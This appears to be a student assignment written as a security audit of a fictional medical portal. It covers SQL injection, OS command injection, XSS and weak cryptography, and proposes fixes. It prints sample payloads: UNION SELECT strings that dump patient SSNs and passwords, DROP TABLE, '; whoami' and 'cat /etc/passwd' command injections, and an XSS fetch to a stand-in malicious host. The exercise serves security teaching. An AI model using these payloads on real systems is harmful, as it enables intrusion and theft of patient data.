# FroggyHealthPortal Security Audit
**Consultant: Eric Norman**
**Date: 04/30/2026**

---

## Part 1: Injection Vulnerability Analysis (50 points)

### Code Snippet 1: Patient Search (10 points)

**1. What type of injection vulnerability exists here?**

String based SQL Injection. Someone can inject something malicious in the query.

**2. Example attack payload:**

```
' OR '1'='1
'; DROP TABLE patients; --
```

**3. What damage could an attacker do with this vulnerability?**

Database read/write/delete access. Steal patient records, change patient records, delete patient records.

---

### Code Snippet 2: Medical Report Generator (10 points)

**1. What type of injection vulnerability exists here?**

An OS Command Injection. Someone can inject something malicious in the cmd. 

**2. Example attack payload:**

```
/report/123; whoami
/report/123 && cat /etc/passwd
```

**3. What could an attacker do with this vulnerability?**

Remote Code Execution. Read/write/delete any file. Attack the internal server.

**4. Why are shell commands with user input dangerous?**

Becasue the command accepts ";" "&&" "|" as seperators and the user can input whatever they want which allows for RCE.

---

### Code Snippet 3: Patient Notes Display (10 points)

**Vulnerability 1:**

- **Type of injection:**

  SQL Injection

- **Attack payload:**

  ```
  /notes/1 UNION SELECT password FROM users--
  ```

- **Impact:**

  This payload pulls all passwords, but other patient information can be pulled aswell. Data can also be destroyed or manipulated. 

**Vulnerability 2:**

- **Type of injection:**

  Cross Site Scripting (XSS)

- **Attack payload:**

  ```
  <script>
    fetch('maliciouswebsite.com/stealinfo')
  </script>
  ```

- **Impact:**

  Malicious code executes in users browser including session hijacking, keylogging, phishing.

---

### Code Snippet 4: Prescription Lookup (10 points)

**1. Identify both SQL injection vulnerabilities:**

WHERE p.patient_id = {patient_id} - Integer expected, but anything can be accepted

AND m.name = '{medication}' - Can be broken by adding a quote ' 

**2. `patient_id` parameter:**

- **Why is it vulnerable even without quotes?**

  Python never validates the type without quotes allowing the user to immediately inject malicious code. The user would have to use a closing quote ' otherwise.

- **Attack payload:**

  ```
  OR 1=1--
  ```

**3. `medication` parameter:**

- **UNION injection to dump all patient data:**

  ```
  ' UNION SELECT ssn, name, dob, address, phone, null, null FROM patients--
  ```

- **How does this attack work?**

  The single quote breaks the input out of the string and nullinfies the original query. UNION SELECT gets patient date, -- discrards everything after injection.

---

### Code Snippet 5: Appointment Email Notifications (10 points)

**1. What injection vulnerability exists here?**

OS Command Injection with two points of entry at "cmd = f'/usr/bin/mail -s "{subject}" {email}'"

**2. Attack payload that executes arbitrary commands:**

```
victim@email.com; whoami
```

**3. Step-by-step explanation of how the attack works:**

Step 1: Attacker provides payload
Step 2: Python interprets the string and builds the command with no validation
Step 3: "shell=True" activates the shell interpreter which parses the string for seperate commands (; && |)
Step 4: Each seperate command executes sequentially

**4. When should `shell=True` be used in Python subprocess?**

Only for fully hard coded commands that need shell specific features. NEVER for user input.

---

## Part 2: Cryptography Mistakes (30 points)

### Code Snippet 6: Password Storage (15 points)

**Cryptography Mistake 1:**

- **What's wrong?**

  MD5 is the wrong hash function for passwords. It is built for speed, and doesn't have the security a password would need. Two different inputs can produce the same hash. The same password always produces the same hash.

- **What attack does this enable?**

  Brute force attack. Attackers can get hashes for common passwords and brute force until they get the right one.

- **How would you fix it?**

  Use a more secure password hasher like bcrypt.

**Cryptography Mistake 2:**

- **What's wrong?**

  No salting. No random value added to each password before hashing. Without it it's easy to reverse engineer the password.

- **What attack does this enable?**

  If an attacker sees multiple users with the same hash, they can infer that they all have the same password. Also, same as before, attackers can more easily brute force a password.

- **How would you fix it?**

  Add a salting function. Or just use bcrypt since it does that automatically.

**Does `check_password` have an exploitable timing attack vulnerability?**

Potentially. In "if password_hash == stored_hash:" Python's == operator does byte by byte comparison that can have timing differences. That means different inputs can take longer or shorter to respond. In some circumstances someone might be able to brute force a password locally.

---

### Code Snippet 7: Session Token Generation (15 points)

**1. What cryptography mistake makes this token generation insecure?**

Python's random is only psuedo random and not suitable for cryptography. This makes every number it generates guessable and mathematically predictable.

**2. How could an attacker predict these session tokens?**

Obtain the request timestamp, reseed random with the timestamp, then generate the same token space.

**3. How long should session tokens be, and why?**

Not any character length but 128 bits of entropy. The current implemetation only has 13 bits of entropy. 128 bits of entropy is 2^128 possible combinations, which is more than enough.

**4. What's the difference between the `random` and `secrets` modules in Python?**

`random` is deterministic, meaning that if the seed number is known then every output is known. `secrets` comes from OS hardware entropy which is unpridictable and secure.

---

## Part 3: Risk Assessment (20 points)

### Vulnerability Rankings

| Rank | Snippet # | Vulnerability Name | Severity |
|---|---|---|---|
| 1 | 1 | SQL Injection (quoted string, single parameter) | Critical |
| 2 | 3 | Stored XSS + Unquoted SQL Injection (chained) | Critical |
| 3 | 4 | Double SQL Injection (unquoted integer + quoted string UNION) | Critical |
| 4 | 7 | Predictable Session Tokens (PRNG + time seed) | High |
| 5 | 2 | OS Command Injection via `os.system()` | High |
| 6 | 5 | OS Command Injection via `shell=True` (two injection points) | High |
| 7 | 6 | MD5 Password Hashing + No Salting + Broken Comparison + No Validation | High |

### Which single vulnerability would you fix first?

The SQL injection in Snippet 1 since it is the easiest to exploit. An attacker can exploit this immediately without any external tools directly in the input. They can also directly access the database which can include sensitive patient information. Also the fix for this relatively easy meaning I could get to fixing another vulnurability more quickly.

### Which vulnerability would take the longest to fix?

Snippet 6, the password storage system. MD5 is not secure so the entire code would have to be switched to a more secure standard like bcrypt. Once everything is switched to bcrypt, every password then needs to be rehashed since none of the hashes are secure. This can take a very long time depending on how big the database is.

### How much do you plan to charge for your security review?

Given the number of vulnarabilities, the codebase will need some serious work. On top of that there will be an extra fee for dealing with sensitive data since this is a medical application. I'm thinking $10,000 :)

### Do you plan to sign up for FroggyHealthPortal?

In its current state, absolutely not (unless my id ends in ' UNION SELECT ssn, name, dob, address, phone, null, null FROM patients--). After my team and I fix the codebase, then I'd gladly sign up.
